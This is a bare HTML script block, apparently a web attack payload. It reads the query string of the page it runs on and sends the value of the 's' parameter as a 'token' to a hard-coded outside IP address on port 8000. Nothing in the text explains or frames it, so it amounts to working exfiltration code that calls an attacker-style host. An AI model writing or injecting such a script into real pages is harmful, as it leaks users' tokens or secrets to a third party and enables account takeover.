<script>
	    var $_GET = (function(){
		        var url = window.document.location.href.toString();
		        var u = url.split("?");
		        if(typeof(u[1]) == "string"){
				        u = u[1].split("&");
				        var get = {};
				        for(var i in u){
						            var j = u[i].split("=");
						            get[j[0]] = j[1];
						        }
				        return get;
				    } else {
					            return {};
					        }
	    })();

    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET', 'http://47.102.210.191:8000/?token='+$_GET['s'], true);
    httpRequest.send();
</script>
